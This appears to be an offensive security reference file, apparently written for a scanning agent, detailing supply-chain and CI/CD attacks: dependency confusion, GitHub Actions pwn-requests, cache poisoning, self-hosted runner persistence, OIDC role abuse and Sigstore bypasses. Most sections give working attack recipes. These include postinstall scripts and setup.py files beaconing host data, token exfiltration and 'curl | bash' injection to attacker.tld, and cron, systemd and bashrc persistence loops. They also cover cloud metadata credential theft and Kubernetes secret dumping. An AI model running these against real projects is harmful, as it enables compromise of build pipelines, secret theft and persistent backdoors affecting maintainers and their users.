---
name: supply-chain-ci-integrity-advanced-deep
description: Supply-chain / CI/CD integrity advanced depth — dependency confusion per-registry resolution-order protocol, GitHub Actions pwn-request full chain, Actions cache-poisoning + artifact-tampering, self-hosted-runner escape and persistence, OIDC federation sub/aud/job_workflow_ref exploitation per cloud, build-system install-script primitives, Sigstore / cosign verification bypass classes, SLSA v1.0 provenance verifier policy, SBOM poisoning, and container-registry manifest / referrer tampering
sibling: supply_chain_ci_integrity
load_when: scan_mode == "deep"
---

# Supply-Chain and CI/CD Integrity — Advanced + Expert Depth

This is the advanced+expert deep sibling to `supply_chain_ci_integrity.md`. The base owns the primitive catalog (dependency confusion, Actions script injection, cache poisoning, self-hosted runner persistence, OIDC claim gaps, build-system install scripts, sigstore bypass classes, SBOM/provenance poisoning, registry tampering), measurement anchors, routing rules, and chaining frames. This file owns the full established technique surface at depth: per-registry resolution-order protocols with Burp-replayable publish recipes; the complete GitHub Actions pwn-request / pull_request_target / cache-poisoning / artifact-tampering chain; self-hosted runner escape and persistence with concrete process-tracking bypass; OIDC federation exploitation per cloud (AWS / GCP / Azure) with claim-condition matrices; build-system install-script primitives per ecosystem; Sigstore / cosign verification-bypass classes with recipe-level depth; SLSA v1.0 provenance verifier policy; SBOM poisoning per format; and container-registry manifest / referrer / blob tampering. The novel sibling owns the 2024–2026 CVE and incident catalog.

Load this file when the goal is executing a specific attack class (building a dependency-confusion publish, exploiting a `pull_request_target` workflow, poisoning the Actions cache, writing a trust-policy exploit for an under-constrained OIDC role, bypassing a cosign verifier, or constructing a tampered SLSA attestation), or when picking between competing primitives on a target that exposes several.

## Dependency Confusion — Full Per-Registry Protocol

### Sub-primitive 1 — npm Resolution Order

**Primitive.** `npm install` resolves scoped packages (`@acme/*`) through registries configured in `.npmrc`. Without an explicit `@acme:registry=...` line, the scope defaults to `registry.npmjs.org`. With `--extra-index-url`-like multi-registry setups (via `publishConfig` or `.npmrc` fallbacks), npm picks the **highest version** across registries — not the registry the maintainer intended.

**All-of preconditions:**
1. Target organization uses an internal npm scope (`@acme/*`) OR an unscoped internal name (`internal-utils`).
2. The organization's `.npmrc` either:
   - omits the `@acme:registry=...` pin, OR
   - uses `registry=` with a fallback via `extra-registry` plugins, OR
   - uses a mirrored virtual registry that proxies through to npmjs.org for cache misses.
3. The attacker-controlled public name is not already registered on public npm (or the attacker has acquired it).

**Attack recipe (publish side):**
```bash
# Attacker publishes a scoped package with a very high version
mkdir attacker-acme && cd attacker-acme
npm init -y
# Edit package.json: "name": "@acme/internal-utils", "version": "99.0.0"
# Add a postinstall script for execution
cat > package.json <<'EOF'
{
  "name": "@acme/internal-utils",
  "version": "99.0.0",
  "description": "placeholder",
  "scripts": { "postinstall": "node collect.js" }
}
EOF
cat > collect.js <<'EOF'
const os = require('os');
const https = require('https');
const data = JSON.stringify({
  host: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  env: Object.keys(process.env)  // key names only — not values, to minimize noise
});
const req = https.request('https://attacker.tld/beacon', { method: 'POST' });
req.write(data); req.end();
EOF
npm publish --access public
```

**Attack recipe (victim side — what triggers resolution):**
```bash
# Victim runs
npm install
# npm reads package.json, sees @acme/internal-utils, resolves scope
# Without @acme:registry pin: queries registry.npmjs.org
# Finds 99.0.0; prefers over 1.0.3 from the internal registry (if internal is reached at all)
# Executes postinstall → collect.js → beacon to attacker.tld
```

**Confirmation signals.**
1. `npm config get @acme:registry` returns `https://registry.npmjs.org/` (the default) rather than `https://npm.internal.acme.corp/`.
2. `npm install --loglevel verbose` shows HTTPS GET to `registry.npmjs.org/@acme/...` for a package the maintainer believed internal.
3. The lockfile `resolved` field points to `https://registry.npmjs.org/@acme/internal-utils/-/...` not the internal URL.
4. `npm view @acme/internal-utils` from a developer workstation returns a different version/maintainer than the internal registry serves.

**Correct defense (reproducible):**
```ini
# .npmrc — scope pinning
@acme:registry=https://npm.internal.acme.corp/
//npm.internal.acme.corp/:_authToken=${INTERNAL_TOKEN}
# always-auth to prevent silent fallback
always-auth=true
```

### Sub-primitive 2 — PyPI Resolution Order

**Primitive.** `pip install` with `--index-url` + `--extra-index-url` has **unordered fallback**: pip queries all configured indexes and selects the highest version. `pip-compile` and `uv` have the same shape with different flag names.

**All-of preconditions:**
1. Project uses `pip.conf` or environment with multiple indexes:
   ```ini
   [global]
   index-url = https://pypi.internal.acme.corp/simple/
   extra-index-url = https://pypi.org/simple/
   ```
2. Attacker publishes `acme-internal-utils==99.0.0` to pypi.org.
3. No `--no-deps` or hash-pinning (`pip install --require-hashes`) in the install step.

**Attack recipe (publish side):**
```bash
# Attacker's project tree
mkdir attacker-acme-utils && cd attacker-acme-utils
cat > pyproject.toml <<'EOF'
[project]
name = "acme-internal-utils"
version = "99.0.0"

[build-system]
requires = ["setuptools>=61"]
build-backend = "setuptools.build_meta"
EOF
mkdir acme_internal_utils
cat > acme_internal_utils/__init__.py <<'EOF'
# benign at import
EOF
cat > setup.py <<'EOF'
# legacy setup.py runs at install time
import os, platform, urllib.request
try:
    data = f"host={platform.node()}&user={os.environ.get('USER','')}"
    urllib.request.urlopen(f"https://attacker.tld/beacon?{data}", timeout=5)
except Exception:
    pass
from setuptools import setup
setup()
EOF
python -m build && python -m twine upload dist/*
```

**Confirmation signals.**
1. `pip install acme-internal-utils --verbose` log shows `Looking in indexes: https://pypi.internal.acme.corp/simple, https://pypi.org/simple`.
2. Installed version is 99.0.0, higher than internal.
3. Egress during `pip install` to `attacker.tld`.
4. `pip show acme-internal-utils` metadata matches the public release.

**Correct defense:**
- `pip-compile` with `--no-cache-dir --index-url=<internal-only>` and `--require-hashes` in the compiled requirements.
- `uv` with `[tool.uv.sources]` pinning per-package to a specific index.
- PyPI package name reservation: register the internal name on public pypi.org as a placeholder.

### Sub-primitive 3 — Maven / Gradle Resolution Order

**Primitive.** `pom.xml` repositories are consulted in declaration order; Nexus / Artifactory virtual repositories defer this ordering to the server-side priority list. When the virtual repository is ordered `maven-central → maven-internal`, Central's higher version wins.

**Attack recipe (publish side).** Requires an OSS Sonatype account and a group ID the attacker controls (`org.sonatype.oss:oss-parent` historical mechanism) OR a group-ID collision with the victim's internal namespace. Group-ID collision: register `com.acme` on central if the victim uses `com.acme` internally and has not reserved it.

**Confirmation signals.**
1. `~/.m2/repository/com/acme/internal-utils/99.0.0/` present with Central's checksums.
2. Build log line `[INFO] Downloading from central: https://repo.maven.apache.org/.../internal-utils-99.0.0.jar`.
3. Internal Artifactory virtual repository audit log shows cache miss followed by Central fetch.

**Correct defense.** `settings.xml` with `<mirrors>` enforcing a single internal mirror; `packageSourceMapping` equivalent (`<mirrors>` + `<repositories>` denylisting Central for internal group IDs).

### Sub-primitive 4 — NuGet packageSourceMapping

**Primitive.** NuGet multi-source default is first-success wins; attacker-published public version of an internal name resolves if public is listed first. `packageSourceMapping` (NuGet 6.0+) is the only reliable defense.

**Attack recipe (configuration audit — reproducible).**
```xml
<!-- Vulnerable nuget.config -->
<configuration>
  <packageSources>
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
    <add key="internal" value="https://nexus.acme.corp/nuget/" />
  </packageSources>
  <!-- NO packageSourceMapping -->
</configuration>
```

**Confirmation signals.**
1. `nuget.config` with multiple `packageSources` and NO `packageSourceMapping` element.
2. Package restore log line showing nuget.org URL for a package named by an internal namespace.
3. Internal namespace prefix (`Acme.*`) not reserved on nuget.org via `prefixReservation`.

### Sub-primitive 5 — Go Module Resolution

**Primitive.** Go modules resolve by *import path*, which includes the hosting domain (`github.com/acme/pkg`). Direct dependency confusion is not applicable to Go. **Typosquatting** is the Go-specific vector: `github.com/acrne/pkg` vs `github.com/acme/pkg`.

**Attack recipe.** Attacker registers `github.com/acrne` (one letter off) and publishes a plausible-looking package.

**Confirmation signals.**
1. `go.sum` contains a module path one Levenshtein-edit from a known internal / popular path.
2. Module author's GitHub profile is newly created, has few other projects, matches the typo-twin's branding closely.

### Primitive-class generalization — resolution-order sources.

The common structural shape across every registry: when a resolver can reach multiple sources for a name AND an attacker can publish to any of them AND version precedence can favor the attacker's publish, the attacker wins. The defense pattern is identical across ecosystems: **one authoritative source per name**, enforced by configuration (`.npmrc` scope pin, `packageSourceMapping`, Maven mirror, uv source pin), not by version-pin discipline — version-pinning only helps for already-installed names.

## GitHub Actions pwn-Request — Full Protocol

### Sub-primitive 1 — `pull_request_target` + Fork-ref Checkout

**Primitive.** The `pull_request_target` trigger runs the base-branch workflow with secrets. When that workflow explicitly checks out the PR's head (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`), the attacker's branch content executes in the privileged context.

**All-of preconditions:**
1. Workflow trigger is `pull_request_target` (or `issue_comment`, `workflow_run`, which have equivalent privilege).
2. Workflow runs a step from the forked branch — directly via `actions/checkout` with the head ref, OR indirectly by installing dependencies from the fork's `package.json` / `pyproject.toml` / `Gemfile`.
3. The workflow has access to secrets (either repository secrets or inherited via `secrets: inherit`).

**Attack recipe.**
```yaml
# Victim workflow (.github/workflows/preview.yml)
on: pull_request_target
jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← attacker's branch
      - run: npm ci   # ← executes postinstall scripts from attacker's package.json
      - run: npm run build
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}  # ← handed to attacker's build step
```

Attacker's fork `package.json`:
```json
{
  "name": "project-fork",
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://attacker.tld/x?t=' + process.env.NPM_TOKEN)\""
  }
}
```

PR trigger: open any PR against the victim repository. Workflow runs; secrets exfiltrate.

**Confirmation signals.**
1. Workflow file contains `on: pull_request_target` AND an `actions/checkout` step whose `ref:` references `pull_request.head.sha` or `pull_request.head.ref`.
2. Workflow installs dependencies (any `*install*` step) after that checkout.
3. Workflow references a secret in a step that comes after the checkout.
4. GitHub Actions UI "Fork pull request workflows" setting is NOT "Require approval for first-time contributors" (or stricter).

### Sub-primitive 2 — `${{ ... }}` Expression Interpolation

**Primitive.** As established in the base, `${{ expression }}` is interpolated into the step script *before* shell parsing. See the base's measured proof. The deep layer is the full expansion of *which* fields are attacker-controlled across GitHub event payloads.

**Full attacker-controlled context field catalog (as of 2026-10):**

| Event | Attacker-controlled fields | Trigger shape |
|---|---|---|
| `pull_request_target` | `github.event.pull_request.{title, body}`, `github.event.pull_request.head.{ref, repo.full_name}`, `github.event.pull_request.user.login`, `github.head_ref` | Any PR |
| `issue_comment` | `github.event.comment.body`, `github.event.issue.title`, `github.event.issue.body` | Any comment on an issue or PR |
| `issues` | `github.event.issue.title`, `github.event.issue.body` | Any new issue |
| `push` | `github.event.commits[*].{message, author.name, author.email}`, `github.event.head_commit.*` | Any push the attacker-authored |
| `pull_request_review_comment` | `github.event.comment.body` | Any review comment |
| `release` | `github.event.release.{name, body, tag_name}` | Any release by anyone with release-write |
| `discussion` / `discussion_comment` | title + body | Any discussion |
| `fork` | `github.event.forkee.*` fields | Any fork |

The elevation table (base) and this field catalog together determine the attack shape: pick a trigger that has write-secret privilege, pick a field that is attacker-controlled on that trigger, use the field in a `run:` step unquoted.

**Attack recipe (comment-triggered privilege).**
```yaml
# Victim workflow
on: issue_comment
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - name: Record triage
        run: echo "Comment: ${{ github.event.comment.body }}" >> triage.log
```

Attacker posts a comment on any open issue:
```
"; curl -s https://attacker.tld/pwn.sh | bash; echo "
```

The runner evaluates: `echo "Comment: "; curl -s https://attacker.tld/pwn.sh | bash; echo ""`. The attacker's remote script executes with the repository's `GITHUB_TOKEN` (and any inherited secrets).

**Correct defense pattern.**
```yaml
# Safe — bind to env, reference as shell variable, quote in bash
- run: echo "Comment: $COMMENT_BODY" >> triage.log
  env:
    COMMENT_BODY: ${{ github.event.comment.body }}
```

The `env:` binding happens *after* shell parsing — attacker metacharacters are literal text.

### Sub-primitive 3 — Composite / Reusable Action Pass-Through

**Primitive.** A composite action receives `inputs.*` and may use them in its own `run:` steps. If the caller passes an attacker-controlled context field into the input and the composite uses it unquoted, the vulnerability is in the composite.

**Attack recipe.** Victim calls a composite action:
```yaml
- uses: ./.github/actions/my-composite
  with:
    message: ${{ github.event.pull_request.title }}
```

Composite action (`.github/actions/my-composite/action.yml`):
```yaml
runs:
  using: composite
  steps:
    - run: echo "Hello ${{ inputs.message }}"
      shell: bash
```

Same injection class — the composite's `run:` sink is reached by the caller's attacker-controlled input.

### Sub-primitive 4 — Marketplace Action Pinning

**Primitive.** Marketplace actions pinned by tag (`@v1`, `@main`) are mutable — the action's maintainer (or attacker who compromises them) can repoint the tag at any commit. The 2024–2025 tj-actions / reviewdog / Shai-Hulud events are instances of this class.

**Correct pinning:**
```yaml
# Mutable — attacker can repoint
- uses: actions/checkout@v4

# Immutable — attacker-independent
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

**Confirmation signals.**
1. Workflow file references any `uses:` with a tag or branch name (`@v1`, `@main`, `@latest`).
2. Repository Dependabot config does not include `github-actions` ecosystem (which pin-updates via SHA when configured).
3. No `.github/workflows/*.yml` audit comparing SHA to tagged release.

### Sub-primitive 5 — `env:` and `with:` Interpolation Sinks

**Primitive.** Expression interpolation into `env:` and `with:` is NOT shell-executed, but the downstream action may still pass the value to a shell. The vulnerability is one layer deeper and harder to spot.

**Attack recipe.**
```yaml
- uses: some-action/with-shell-sink@v1
  with:
    command: build-${{ github.event.pull_request.title }}
# The action's own code runs: exec(`command}`), splitting on the attacker's metacharacters.
```

**Confirmation signals.**
1. Action documentation describes an input as "passed to shell" or "command string."
2. Action source code calls `exec`, `execSync`, `child_process.spawn` with `shell: true`.
3. Input value includes attacker-controlled context fields.

## Actions Cache Poisoning — Full Attack Recipe

### Primitive

Actions cache keys are repository-scoped and branch-shared by default. The `actions/cache` action (`v3`, `v4`) saves and restores cache entries keyed by the user-specified key. Writes on any branch (including fork branches reached via `pull_request_target`) populate the shared pool; later restores on `main` pick up those entries.

### All-of Preconditions

1. Workflow saves to cache from a privileged context an attacker can reach (either `pull_request_target` + checkout of attacker-ref, OR open-contribution `pull_request` that writes cache — rarer).
2. Downstream workflow restores from the same key or a matching `restore-keys` prefix.
3. The restored content executes or is linked into the build (lockfile, binary, compiled artifact).
4. GitHub's July 2026 `cache-mode: restore-only` on the restoring workflow is NOT configured.

### Attack Recipe (Timeline)

**Step 1 — Open a PR against the target.** The PR's `pull_request_target` workflow runs, with checkout of the fork's ref. The workflow installs dependencies (attacker-controlled `package.json`).

**Step 2 — Attacker payload mutates installed files, then saves to cache.** From inside the install step:
```javascript
// Attacker's postinstall script
const fs = require('fs');
// Overwrite a native binary module with attacker's compiled payload
fs.writeFileSync('/path/to/node_modules/some-dep/build/Release/binding.node', attackerPayload);
```

**Step 3 — Workflow calls `actions/cache` with the key.** The compromised `node_modules/` goes to the cache.

**Step 4 — Attacker closes the PR.** Main-branch workflow runs later, restores `node_modules/` from the poisoned cache.

**Step 5 — Main-branch workflow installs via cache restore, builds, publishes.** The published artifact carries the attacker's compiled payload. The sigstore signature over this artifact — produced by the project's own keyless identity — is valid.

### Confirmation Signals

1. `actions/cache@v*` or `actions/cache/save` in a workflow triggered by `pull_request_target` / `issue_comment` / `workflow_run`.
2. Cache key is NOT scoped to the base-branch `ref` or a trusted-SHA (uses `hashFiles(...)` of files the attacker can modify).
3. The downstream main-branch workflow restores the same key.
4. No `cache-mode: restore-only` on the main-branch workflow (introduced by GitHub in July 2026 as the mitigation).

### False Positives

A cache that is key-partitioned per-branch (`key: ${{ github.ref }}-build`) is not shared across branches and prevents this class on the fork → main vector. A cache restored into a step that only tests but does not publish is not immediately exploitable.

## OIDC Federation — Per-Cloud Exploitation Protocol

### AWS — `sts:AssumeRoleWithWebIdentity`

**Primitive.** The IAM role's trust policy specifies which OIDC-issued JWT claims must match for the assume-role to succeed. A policy that omits `sub` (or uses a wildcard) allows any workflow in any repository on github.com to assume the role.

**Available claim keys** (as of the GitHub Actions OIDC token in 2026-10, confirmed on `token.actions.githubusercontent.com/.well-known/openid-configuration`):
- `aud` (audience) — defaults to `sts.amazonaws.com` for AWS-targeted flows.
- `sub` (subject) — `repo:<org>/<repo>:<context>` where context is `ref:refs/heads/<branch>`, `pull_request`, `environment:<env>`, or `job_workflow_ref:...`.
- `repository_owner`, `repository`, `ref`, `environment`, `job_workflow_ref` — each available as a separate claim key.

**Attack recipe — exploit under-conditioned role.**
```json
// Target victim role trust policy (vulnerable)
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::VICTIM:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" }
    // sub condition missing — any github.com repo can assume
  }
}
```

Attacker's workflow in a repository they control:
```yaml
on: workflow_dispatch
permissions:
  id-token: write
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::VICTIM:role/github-actions
          aws-region: us-east-1
      - run: aws sts get-caller-identity
      - run: aws s3 ls   # continue with role's permissions
```

**Confirmation signals.**
1. IAM role trust policy where `Principal.Federated` references `token.actions.githubusercontent.com` AND `Condition` has no `sub` or `job_workflow_ref` key.
2. CloudTrail event `AssumeRoleWithWebIdentity` where the `userIdentity.sessionContext.sessionIssuer` is unexpected.
3. `sub` condition uses `StringLike` with a wildcard that includes repos outside the organization's expected set (`StringLike: "token.actions.githubusercontent.com:sub": "repo:acme/*"` — vulnerable to any `acme/*` repo).
4. `repository_owner` condition set but `repository` not set — vulnerable to any repo owned by the organization, including abandoned public forks.

**Correct scope.**
```json
"StringEquals": {
  "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
  "token.actions.githubusercontent.com:sub": "repo:acme/service:ref:refs/heads/main"
}
```

Or, for environment-protected roles:
```json
"StringEquals": {
  "token.actions.githubusercontent.com:sub": "repo:acme/service:environment:production"
}
```

Or, for a pinned workflow:
```json
"StringEquals": {
  "token.actions.githubusercontent.com:job_workflow_ref": "acme/service/.github/workflows/deploy.yml@refs/heads/main"
}
```

### GCP — Workload Identity Federation

**Primitive.** Workload Identity Pools (WIP) + Workload Identity Providers (WIPs) authenticate external OIDC tokens into Google IAM. Attribute conditions on the provider map claims to Google-side attributes; absence of attribute conditions is the vulnerable shape. Separately, the pool's attached service accounts carry an `iam.workloadIdentityUser` role grant whose principal set determines who can impersonate — a wildcard principal is a second common misconfiguration.

**Correct provider attribute condition:**
```
assertion.repository == 'acme/service' && assertion.ref == 'refs/heads/main'
```

**Attack recipe — exploit under-conditioned WIP provider.**
```bash
# Attacker's workflow in a repository they control
# Requires: id-token write permission; identifies the victim's pool/provider from
# public documentation, open-source config, or inadvertent config leaks.

cat > wif-exploit.yml <<'EOF'
on: workflow_dispatch
permissions:
  id-token: write
  contents: read
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - id: 'auth'
        uses: 'google-github-actions/auth@v2'
        with:
          workload_identity_provider: 'projects/VICTIM_PROJECT_NUMBER/locations/global/workloadIdentityPools/VICTIM_POOL/providers/VICTIM_PROVIDER'
          service_account: 'target-sa@VICTIM_PROJECT.iam.gserviceaccount.com'
      - run: gcloud auth list
      - run: gcloud projects list
      - run: gcloud storage ls   # continue with service account permissions
EOF
```

The attack succeeds when:
1. The provider has no `attributeCondition` OR has one that evaluates `true` for the attacker's token (e.g., `assertion.repository_owner != ''`), AND
2. The service account's `roles/iam.workloadIdentityUser` IAM binding has a principalSet that includes `principalSet://.../attribute.repository_owner/*` or similar wildcarded shape, OR a `principal://` entry listing a repository the attacker controls.

**Confirmation signals (GCP WIP).**
1. `gcloud iam workload-identity-pools providers describe <PROVIDER>` returns no `attributeCondition` field OR an attributeCondition that doesn't constrain `assertion.repository`.
2. `gcloud iam service-accounts get-iam-policy <SA>` lists a principal set of shape `principalSet://iam.googleapis.com/.../attribute.repository_owner/<org>` (over-broad; any repo under that owner can impersonate).
3. Service account's IAM policy has `members: ["principalSet://.../*"]` with no attribute constraint.
4. Cloud Audit log `google.iam.credentials.v1.IAMCredentials.GenerateAccessToken` events sourced from unexpected `request.auth.identity`.

**Correct scope (GCP WIP).**
```bash
# Provider-level attribute condition (prevents token acceptance)
gcloud iam workload-identity-pools providers update-oidc <PROVIDER> \
  --workload-identity-pool=<POOL> --location=global \
  --attribute-condition="assertion.repository == 'acme/service' && assertion.ref == 'refs/heads/main'"

# Service-account IAM binding (prevents impersonation beyond intended identity)
gcloud iam service-accounts add-iam-policy-binding target-sa@... \
  --role=roles/iam.workloadIdentityUser \
  --member="principal://iam.googleapis.com/projects/.../subject/repo:acme/service:ref:refs/heads/main"
```

### Azure — Federated Credentials

**Primitive.** Azure App Registration federated credentials match the incoming token's `iss` + `sub` + `aud` directly against a stored tuple — no conditional expression language, no wildcard support. The vulnerability class is misconfiguration: multiple federated credentials added with overly broad `subject` strings, OR a federated credential's `subject` reused across multiple environments (dev/stage/prod) that should have been separated.

**Vulnerable federated credential shape:**
```json
{
  "name": "github-ci",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:acme/*:environment:production",
  "audiences": ["api://AzureADTokenExchange"]
}
```

The `*` in `subject` is NOT a wildcard — Azure matches literally — but a pattern like `repo:acme/service:pull_request` grants PR-triggered workflows (fork-authored) the same token privilege as `main`.

**Attack recipe — subject-reuse exploitation.** If the federated credential's `subject` is `repo:acme/service:pull_request`, any attacker opening a PR against `acme/service` triggers a workflow that mints an OIDC token with that exact subject; `AssumeRoleWithWebIdentity` to the mapped Azure identity succeeds.

**Confirmation signals (Azure).**
1. `az ad app federated-credential list --id <APP_ID>` returns a credential with `subject` matching `pull_request` or `environment:preview`.
2. Multiple federated credentials on the same App Registration (should be one per subject).
3. App Registration's role assignments extend beyond the intended environment (contributor on prod resource group while the federated credential targets `pull_request`).
4. Sign-in logs show federated token-exchange events from unexpected GitHub repositories.

**Correct scope (Azure).** One federated credential per environment, with explicit subject like `repo:acme/service:environment:production`, and Azure RBAC role assignments scoped to only that environment's resources.

### OIDC Claim-Validation Discipline — Audit Checklist

1. **Every OIDC-federated role / service-account** has a `sub` or equivalent condition.
2. The condition is `StringEquals` (not `StringLike` with `*`).
3. The condition pins repo + branch/environment/workflow — not just repo.
4. CloudTrail / Cloud Audit Logs are reviewed for unexpected assume-role events.
5. The federated identity provider's thumbprint is pinned (AWS: `oidc-provider` thumbprint must match GitHub's cert chain).

## Self-Hosted Runner Escape and Persistence

### Sub-primitive 1 — RUNNER_TRACKING_ID Bypass

**Primitive.** When a job completes, the runner's cleanup phase kills orphaned processes by matching the `RUNNER_TRACKING_ID` environment variable in each process's `/proc/<pid>/environ`. By setting the variable to `0` (or any value other than the job's actual ID), the spawned process survives.

**Attack recipe (inside a workflow step):**
```bash
nohup bash -c '
  while true; do
    curl -s https://attacker.tld/c2 | bash
    sleep 300
  done
' < /dev/null > /dev/null 2>&1 &
BG_PID=$!
# Overwrite the environment of the running child
disown $BG_PID
# NB: /proc/<pid>/environ is read-only after exec — the correct technique is to
# set the variable BEFORE spawning, inside a subshell:
( export RUNNER_TRACKING_ID=0; nohup bash -c '... loop ...' < /dev/null > /dev/null 2>&1 & )
```

### Sub-primitive 2 — Non-Ephemeral Runner Reuse

**Primitive.** A runner registered without `--ephemeral` processes jobs sequentially. Workspace state leaks across jobs: files in `$RUNNER_WORKSPACE`, caches in `/home/runner/.cache`, SSH known_hosts, Node / Python / Docker cached layers. An attacker who runs a job that writes a backdoor to `~/.bashrc` or an auto-executed systemd user unit has persistence until the host is rotated.

**Persistence mechanism catalog.** Each is a one-step attack from inside a reachable workflow step. All five run with the runner-process user privilege (typically `runner` on managed images; the service account's user on self-managed).

```bash
# A. ~/.bashrc — fires on every subsequent interactive job or shell step
echo 'curl -s https://attacker.tld/stage2 | bash &' >> ~/.bashrc

# B. ~/.profile / ~/.bash_profile — login-shell triggered
echo 'nohup curl -s https://attacker.tld/stage2 | bash &' >> ~/.profile

# C. Systemd user unit — survives reboots, user service manager auto-starts
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/updater.service <<'EOF'
[Service]
ExecStart=/bin/bash -c 'curl -s https://attacker.tld/stage2 | bash'
Restart=always
[Install]
WantedBy=default.target
EOF
systemctl --user daemon-reload && systemctl --user enable --now updater

# D. Cron for the runner user
(crontab -l 2>/dev/null; echo '*/15 * * * * curl -s https://attacker.tld/stage2 | bash') | crontab -

# E. Hook into actions-runner lifecycle via Runner.Listener wrapper
# Edit $RUNNER_HOME/run.sh to prepend attacker payload before the real listener loop
RUNNER_HOME="$HOME/actions-runner"
sed -i '1a /bin/bash -c "curl -s https://attacker.tld/stage2 | bash" &' "$RUNNER_HOME/run.sh"
```

**Confirmation signals.**
1. `actions-runner/.runner` configuration file lacks `ephemeral: true`.
2. The runner process (`Runner.Listener`) PID has been running for days — persistence proof.
3. `~/.bashrc`, `~/.profile`, `~/.config/systemd/user/*.service`, `/etc/cron.d/*`, `$HOME/actions-runner/run.sh` modified after a known-malicious workflow run.
4. Repository / organization setting "Require approval for all outside collaborators" is OFF.
5. `systemctl --user list-units` on the runner host returns an unexpected user unit.
6. `crontab -l` for the runner user returns entries that didn't come from the host image.

### Sub-primitive 3 — Runner-to-Network Lateral Movement

**Primitive.** Self-hosted runners deployed in corporate networks commonly have default-allow egress to internal services (databases, Kubernetes API servers, cloud metadata endpoints). An attacker executing on the runner reaches those endpoints with no cross-boundary friction.

**Attack recipe.**
```bash
# From inside the compromised runner job
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns instance-role credentials — if runner is on EC2 without IMDSv2 required

# Lateral:
kubectl --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" get secrets -A
# If the runner pod has k8s API access
```

**Confirmation signals.**
1. Runner VM has IMDSv2 not required (hop limit 1 insufficient on recent EC2 defaults; must be `HttpTokens=required` + hop limit 1).
2. Runner pod's service account has cluster-reader or namespace secret-reader privilege.
3. Runner's network ACL allows egress to internal Service IPs or cloud metadata.

## Code-Signing and Sigstore Verification Bypass

### Sub-primitive 1 — Keyless Verify Without Identity Pin

**Primitive.** `cosign verify` with no `--certificate-identity` and no `--certificate-oidc-issuer` accepts any valid Sigstore signature. The signature's math checks out; the signer could be anyone with a `token.actions.githubusercontent.com` claim.

**Attack recipe.** Attacker's own repository runs a release workflow that signs an artifact of the attacker's choosing. The artifact's digest matches a victim-looking name. A downstream consumer that calls `cosign verify` without pinning sees "signature valid" and proceeds.

**Confirmation signals.**
1. Any `cosign verify` call without both `--certificate-identity` and `--certificate-oidc-issuer`.
2. CI documentation / README that shows `cosign verify <image>` with no additional flags.
3. Policy OPA / Kyverno `verifyImages` rule missing the `attestors.entries[*].keyless.subjects` list.

### Sub-primitive 2 — Legacy Bundle Public-Key Fallback

**Primitive.** When Cosign read a legacy bundle's `cert` field and X.509 parsing failed, it fell back to loading it as a raw public key — and in that path, skipped `--certificate-identity` and `--certificate-oidc-issuer` enforcement. Attacker crafts a bundle with a non-X.509 `cert` field; verification succeeds with identity enforcement silently disabled.

**Confirmation signals.**
1. Cosign version pre-dates the legacy-bundle-fallback fix (per-version metadata in `supply_chain_ci_integrity_novel_deep.md`).
2. Bundle file (`.sig` / `.bundle`) whose `cert` field is not an X.509 certificate (ASCII-armor PEM with `BEGIN PUBLIC KEY` instead of `BEGIN CERTIFICATE`).
3. `cosign verify-blob --bundle` call that passes identity flags but succeeds against a bundle it should reject.

### Sub-primitive 3 — Rekor Entry Disassociation (CVE-2026-22703 class)

**Primitive.** Cosign bundle verification pre-CVE-2026-22703-fix did not re-verify that the embedded Rekor entry's `subject` referenced the bundle's own artifact digest, signature, or public key. Attacker constructs a bundle whose Rekor entry is any valid Rekor entry (even one from a different artifact); verification succeeds. Version metadata in `supply_chain_ci_integrity_novel_deep.md § Class H`.

**Attack recipe (sketch).** Fetch any valid Rekor entry; embed in the bundle alongside the attacker's artifact; present to the verifier. The signature math over the attacker's artifact uses the attacker's own key; the Rekor-entry presence tricks the verifier into treating the signature as transparency-logged.

**Confirmation signals.**
1. Cosign version 2.6.1 or earlier (v2 line) OR 3.0.3 or earlier (v3 line).
2. Rekor-entry subject in the bundle does not match the artifact's digest.
3. Verifier does not re-fetch the Rekor entry from the transparency log and compare its contents.

### Sub-primitive 4 — Policy Document Scope Confusion

**Primitive.** A Kyverno / OPA policy that `verifyImages` with a `keyless` block that lists a `subject` regex matches may accept subjects it should reject when the regex is too permissive or when the policy is applied to the wrong namespace scope.

**Confirmation signals.**
1. Kyverno `verifyImages` policy with `subject: ".*"` or `subject: ".*@github.com"`.
2. Policy applied to a namespace where some pods are expected to run images not signed by the organization.
3. Policy with `attestors` list but no `count` requirement (defaults to 1 — any single matching attestor passes).

### Sub-primitive 5 — Trusted-Root Pinning

**Primitive.** Cosign v2+ supports `--trusted-root` for pinning the Sigstore trust root (Fulcio CA, Rekor key, CT log key). Verifiers that use the default public Sigstore root trust whatever OpenSSF's trust-root rotations ship. A trust-root pin is the correct deeper defense; its absence is a defense-in-depth gap, not a direct vulnerability.

## SBOM / SLSA Provenance Verification Policy

### Sub-primitive 1 — SLSA v1.0 Field Pinning

**Primitive.** The SLSA v1.0 attestation schema has `subject[*].digest`, `predicate.buildDefinition.{buildType, externalParameters, resolvedDependencies}`, and `predicate.runDetails.{builder.id, metadata, byproducts}`. A verifier that pins subset of these fields may accept attacker-produced attestations.

